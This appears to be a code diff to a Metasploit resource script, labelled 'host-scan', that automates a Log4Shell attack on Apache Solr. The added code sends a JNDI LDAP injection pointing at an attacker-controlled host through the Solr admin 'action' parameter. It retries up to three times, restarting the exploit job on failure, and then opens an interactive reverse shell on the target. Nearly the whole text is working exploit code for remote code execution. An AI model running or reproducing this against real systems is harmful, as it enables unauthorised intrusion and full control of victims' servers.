@@ -424,58 +424,94 @@ def run_cmd(cmd, session_id)
   sleep(0.5)
 end
 
-# Wait for the LDAP and HTTP servers to start (verify ports are listening)
-puts "\033[0;35m[host-scan]\033[0m Waiting for LDAP/HTTP servers to start..."
-require 'socket'
-[1389, 8080].each do |port|
-  ready = false
-  20.times do
+# Helper: wait for a port on the correct interface (SRVHOST, not localhost)
+def wait_for_port(host, port, timeout = 30)
+  require 'socket'
+  timeout.times do
     begin
-      s = TCPSocket.new('127.0.0.1', port)
+      s = TCPSocket.new(host, port)
       s.close
-      ready = true
-      break
+      return true
     rescue
       sleep(1)
     end
   end
-  if ready
-    puts "\033[0;35m[host-scan]\033[0m   Port #{port} is listening."
-  else
-    puts "\033[0;35m[host-scan]\033[0m \033[0;31m  WARNING: Port #{port} not listening after 20s\033[0m"
-  end
+  false
 end
 
-# Inject JNDI payload via Solr query parameter (which IS logged by Log4j)
-jndi_str = "\${jndi:ldap://${ATTACKER_IP}:1389/exploit}"
+# Helper: send JNDI injection and wait for reverse shell
+def send_jndi_and_wait(target_url, wait_secs = 60)
+  require 'net/http'
+  begin
+    uri = URI(target_url)
+    Net::HTTP.get_response(uri)
+    puts "\033[0;35m[host-scan]\033[0m Request sent. Waiting for reverse shell..."
+  rescue => e
+    puts "\033[0;35m[host-scan]\033[0m Request sent (#{e.message}). Waiting for reverse shell..."
+  end
+
+  wait_secs.times do |i|
+    sleep(1)
+    return true if framework.sessions.count > 0
+    if (i + 1) % 10 == 0
+      puts "\033[0;35m[host-scan]\033[0m   [#{i + 1}s] Waiting for reverse shell..."
+    end
+  end
+  false
+end
+
+srvhost = "${ATTACKER_IP}"
+jndi_str = "\${jndi:ldap://#{srvhost}:1389/exploit}"
 target_url = "http://${TARGET_IP}:${EXPLOIT_PORT}/solr/admin/cores?action=#{jndi_str}"
-puts "\033[0;35m[host-scan]\033[0m Sending JNDI injection via Solr action parameter..."
-puts "\033[0;35m[host-scan]\033[0m   URL: #{target_url}"
-puts ""
+max_attempts = 3
+got_session = false
 
-require 'net/http'
-begin
-  uri = URI(target_url)
-  Net::HTTP.get_response(uri)
-  puts "\033[0;35m[host-scan]\033[0m Request sent. Waiting for reverse shell..."
-rescue => e
-  puts "\033[0;35m[host-scan]\033[0m Request sent (#{e.message}). Waiting for reverse shell..."
-end
-
-# Wait for the target to process JNDI lookup -> LDAP -> HTTP -> reverse shell
-120.times do |i|
-  sleep(1)
-  break if framework.sessions.count > 0
-  if (i + 1) % 10 == 0
-    puts "\033[0;35m[host-scan]\033[0m   [#{i + 1}s] Waiting for reverse shell..."
-  end
-end
-puts ""
-
-# Check if we got a session
-if framework.sessions.count == 0
+max_attempts.times do |attempt|
+  puts "\033[0;35m[host-scan]\033[0m Exploit attempt #{attempt + 1}/#{max_attempts}..."
   puts ""
-  puts "\033[0;35m[host-scan]\033[0m \033[0;31mFAILED: No reverse shell established.\033[0m"
+
+  # Wait for LDAP and HTTP servers on the correct interface (SRVHOST, not localhost)
+  puts "\033[0;35m[host-scan]\033[0m Waiting for LDAP/HTTP servers on #{srvhost}..."
+  servers_ready = true
+  [1389, 8080].each do |port|
+    if wait_for_port(srvhost, port, 30)
+      puts "\033[0;35m[host-scan]\033[0m   Port #{port} is listening on #{srvhost}."
+    else
+      puts "\033[0;35m[host-scan]\033[0m \033[0;31m  Port #{port} not listening after 30s\033[0m"
+      servers_ready = false
+    end
+  end
+
+  unless servers_ready
+    puts "\033[0;35m[host-scan]\033[0m \033[0;31mServers not ready. Restarting exploit...\033[0m"
+    run_single("jobs -K")
+    sleep(2)
+    run_single("exploit -j -z")
+    sleep(3)
+    next
+  end
+
+  # Inject JNDI payload via Solr query parameter (which IS logged by Log4j)
+  puts "\033[0;35m[host-scan]\033[0m Sending JNDI injection via Solr action parameter..."
+  puts "\033[0;35m[host-scan]\033[0m   URL: #{target_url}"
+  puts ""
+
+  if send_jndi_and_wait(target_url, 60)
+    got_session = true
+    break
+  end
+
+  # No session — retry with fresh exploit job
+  puts "\033[0;35m[host-scan]\033[0m \033[0;33mNo session on attempt #{attempt + 1}. Retrying...\033[0m"
+  run_single("jobs -K")
+  sleep(2)
+  run_single("exploit -j -z")
+  sleep(3)
+end
+puts ""
+
+if !got_session
+  puts "\033[0;35m[host-scan]\033[0m \033[0;31mFAILED: No reverse shell after #{max_attempts} attempts.\033[0m"
   puts "\033[0;35m[host-scan]\033[0m Possible causes:"
   puts "\033[0;35m[host-scan]\033[0m   - Target JDK >= 8u191 (JNDI class loading restricted)"
   puts "\033[0;35m[host-scan]\033[0m   - Target Log4j patched (>= 2.17.0)"
@@ -484,24 +520,21 @@ if framework.sessions.count == 0
   puts ""
   run_single("jobs -K")
   run_single("exit")
+else
+  \$session_id = framework.sessions.keys.first
+  puts ""
+  puts "\033[0;35m#{'=' * 80}\033[0m"
+  puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established (session #{\$session_id})\033[0m"
+  puts "\033[0;35m#{'=' * 80}\033[0m"
+  puts ""
+  puts "\033[0;35m[host-scan]\033[0m RCE achieved via Log4Shell JNDI injection in Solr action parameter."
+  puts ""
+  puts "\033[0;35m[host-scan]\033[0m Dropping into interactive session. Type 'exit' or Ctrl+C to disconnect."
+  puts ""
+
+  # Drop into the interactive shell session
+  run_single("sessions -i #{\$session_id}")
 end
-
-\$session_id = framework.sessions.keys.first
-puts ""
-puts "\033[0;35m#{'=' * 80}\033[0m"
-puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established (session #{\$session_id})\033[0m"
-puts "\033[0;35m#{'=' * 80}\033[0m"
-puts ""
-puts "\033[0;35m[host-scan]\033[0m RCE achieved via Log4Shell JNDI injection in Solr action parameter."
-puts ""
-puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established.\033[0m"
-puts ""
-puts "\033[0;35m[host-scan]\033[0m Dropping into interactive session #{\$session_id}..."
-puts "\033[0;35m[host-scan]\033[0m Type commands directly. Type 'exit' or Ctrl+C to disconnect."
-puts ""
-
-# Drop into the interactive shell session
-run_single("sessions -i #{\$session_id}")
 </ruby>
 
 jobs -K
